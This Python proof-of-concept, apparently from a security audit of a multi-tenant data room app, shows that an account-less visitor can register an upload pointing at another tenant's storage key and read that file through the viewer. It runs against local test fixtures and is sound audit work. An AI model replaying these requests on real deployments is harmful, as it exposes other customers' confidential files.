#!/usr/bin/env python3
"""PM-21 — a data room visitor with no account registers a "visitor upload" whose
storage key points at another tenant's object, then reads it back through the
ordinary viewer path.

The proof clears its own rows before and after, and prints the whole-schema
row-count delta after cleanup (expected empty).

    docker exec -e PYTHONPATH=/opt/poc-deps pm-audit-app \
        python3 /app/security-review/pm-21-visitor-upload-arbitrary-storage-key/poc.py
"""
import sys
import pathlib
import time

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "_poc"))
from pmpoc import (  # noqa: E402
    BASE, db, db_close, get, post, as_json, mint_cookie, build_id, fetch_bytes,
    table_counts, count_delta, VULN, CONTROL, OBSERVE, log, summary,
)

# ---- discover fixtures (robust to a reseed) --------------------------------
VICTIM_TEAM = db('select "teamId" from "User" u join "UserTeam" ut on ut."userId"=u.id '
                 "where u.email=$1", ["alice@victim.test"])[0]["teamId"]
ROOM = db('select id from "Dataroom" where "teamId"=$1 and name=$2',
          [VICTIM_TEAM, "Victim Secret Dataroom"])[0]["id"]
OTHER_TEAM = db('select "teamId" from "User" u join "UserTeam" ut on ut."userId"=u.id '
                "where u.email=$1", ["mallory@attacker.test"])[0]["teamId"]
# A real object that belongs to the unrelated tenant: pick a DocumentVersion whose
# key sits under OTHER_TEAM's prefix (the bucket reseeder has a marker object for it).
TARGET_KEY = db('select dv.file from "DocumentVersion" dv join "Document" d on d.id=dv."documentId" '
                "where d.\"teamId\"=$1 and dv.file like $2 order by dv.\"createdAt\" limit 1",
                [OTHER_TEAM, OTHER_TEAM + "/%"])[0]["file"]
VISITOR_EMAIL = f"visitor-{int(time.time())}@outsider.test"
SELLER = mint_cookie("alice@victim.test")


def cleanup():
    links = [r["id"] for r in db('select id from "Link" where name=$1', ["PM-21 upload-enabled link"])]
    docs = [r["id"] for r in db('select id from "Document" where name=$1', ["innocent-looking.pdf"])]
    viewers = [r["id"] for r in db("select id from \"Viewer\" where email like 'visitor-%@outsider.test'")]
    db('delete from "View" where "linkId"=any($1) or "viewerId"=any($2) or "documentId"=any($3)',
       [links, viewers, docs])
    db('delete from "DocumentUpload" where "documentId"=any($1) or "linkId"=any($2)', [docs, links])
    db('delete from "DataroomDocument" where "documentId"=any($1)', [docs])
    db('delete from "DocumentPage" where "versionId" in '
       '(select id from "DocumentVersion" where "documentId"=any($1))', [docs])
    db('delete from "DocumentVersion" where "documentId"=any($1)', [docs])
    db('delete from "Document" where id=any($1)', [docs])
    db('delete from "Link" where id=any($1)', [links])
    db('delete from "Viewer" where id=any($1)', [viewers])
    return {"links": len(links), "docs": len(docs), "viewers": len(viewers)}


pre = cleanup()
baseline = table_counts()

log(f"PM-21 — visitor upload accepts an arbitrary storage key   base={BASE}")
log(f"  room={ROOM} (team {VICTIM_TEAM})   target key belongs to {OTHER_TEAM}")
log(f"  TARGET_KEY={TARGET_KEY}")
log("")

try:
    # ---- fixture: seller creates a GENERAL dataroom link with visitor upload on
    mk_status, mk_text, _ = post("/api/links", {
        "linkType": "DATAROOM_LINK", "targetId": ROOM, "teamId": VICTIM_TEAM,
        "name": "PM-21 upload-enabled link", "enableUpload": True, "emailProtected": True,
        "audienceType": "GENERAL", "allowList": [], "denyList": [],
    }, SELLER)
    LINK = as_json(mk_text).get("id")
    CONTROL("seller creates an upload-enabled data room link",
            mk_status == 200 and bool(LINK), f"status={mk_status} link={LINK}")
    link_row = db('select "enableUpload","audienceType","groupId","teamId" from "Link" where id=$1',
                  [LINK])[0] if LINK else {}
    CONTROL("link row: enableUpload=true, no group",
            link_row.get("enableUpload") is True and link_row.get("groupId") is None,
            str(link_row))

    # ---- visitor, no account: enter the room with a self-asserted email
    v_status, v_text, v_hdrs = post("/api/views-dataroom", {
        "linkId": LINK, "dataroomId": ROOM, "email": VISITOR_EMAIL, "viewType": "DATAROOM_VIEW",
    })
    set_cookie = v_hdrs.get("set-cookie", "") or ""
    import re
    m = re.search(r"pm_drs_[^=]+=[^;]+", set_cookie)
    drs = m.group(0) if m else None
    CONTROL("visitor enters the room and receives a dataroom session cookie",
            v_status == 200 and bool(drs), f"status={v_status} viewerId={as_json(v_text).get('viewerId')}")

    # ---- control: the target key is absent from the room's listing pre-attack
    bid = build_id()
    ld_status, ld_text, _ = get(f"/_next/data/{bid}/view/{LINK}.json?linkId={LINK}", drs)
    CONTROL("room listing does not reference the unrelated tenant's key before the attack",
            TARGET_KEY not in ld_text, f"status={ld_status}")

    # ---- attack: register an "upload" whose key is the unrelated tenant's object
    up_status, up_text, _ = post(f"/api/links/{LINK}/upload", {
        "dataroomId": ROOM,
        "documentData": {
            "name": "innocent-looking.pdf", "key": TARGET_KEY, "storageType": "S3_PATH",
            "contentType": "image/png", "supportedFileType": "image", "fileSize": 128,
        },
    }, drs)
    OBSERVE("upload response", f"status={up_status} body={up_text[:160]}")
    doc_rows = db('select d.id, d."teamId", d.file, d."isExternalUpload", dv.id as vid '
                  'from "Document" d join "DocumentVersion" dv on dv."documentId"=d.id '
                  'where d."teamId"=$1 and d.file=$2 order by d."createdAt" desc limit 1',
                  [VICTIM_TEAM, TARGET_KEY])
    doc_row = doc_rows[0] if doc_rows else None
    VULN("Document row created in the room's team with file = the unrelated tenant's key",
         bool(doc_row) and doc_row["file"] == TARGET_KEY, str(doc_row))
    drd = db('select id from "DataroomDocument" where "dataroomId"=$1 and "documentId"=$2',
             [ROOM, doc_row["id"]]) if doc_row else []
    VULN("DataroomDocument row attaches it to the room", bool(drd))

    # ---- read it back as the visitor through the normal document view path
    file_url, byts, dv_status = None, b"", 0
    if doc_row:
        dv_status, dv_text, _ = post("/api/views-dataroom", {
            "linkId": LINK, "dataroomId": ROOM, "email": VISITOR_EMAIL, "viewType": "DOCUMENT_VIEW",
            "documentId": doc_row["id"], "documentVersionId": doc_row["vid"], "hasPages": False,
        }, drs)
        file_url = as_json(dv_text).get("file")
        OBSERVE("DOCUMENT_VIEW response", f"status={dv_status} file={(file_url or '')[:100]}")
        if file_url:
            _, byts = fetch_bytes(file_url)
    VULN("viewer path signs a URL for the unrelated tenant's object",
         dv_status == 200 and bool(file_url) and TARGET_KEY in (file_url or ""))
    text_bytes = byts.decode("latin1", "replace")
    VULN("fetched bytes are the unrelated tenant's object",
         f"team={OTHER_TEAM}" in text_bytes, text_bytes.strip()[:110])

    # ---- control: the same request with no dataroom session is refused
    noc_status, _, _ = post(f"/api/links/{LINK}/upload", {
        "dataroomId": ROOM,
        "documentData": {"name": "x", "key": TARGET_KEY, "storageType": "S3_PATH",
                         "contentType": "application/pdf", "supportedFileType": "pdf", "fileSize": 1},
    })
    CONTROL("upload route refuses a caller with no dataroom session",
            noc_status == 401, f"status={noc_status}")
finally:
    post_ = cleanup()
    delta = count_delta(baseline, table_counts())
    log("")
    log(f"  pre-run cleanup removed  : {pre}")
    log(f"  post-run cleanup removed : {post_}")
    log(f"  row-count delta vs baseline after cleanup: {delta}"
        + ("  <- NOT fully restored" if delta else "  (restored)"))

summary("PM-21 visitor upload / arbitrary storage key")
db_close()
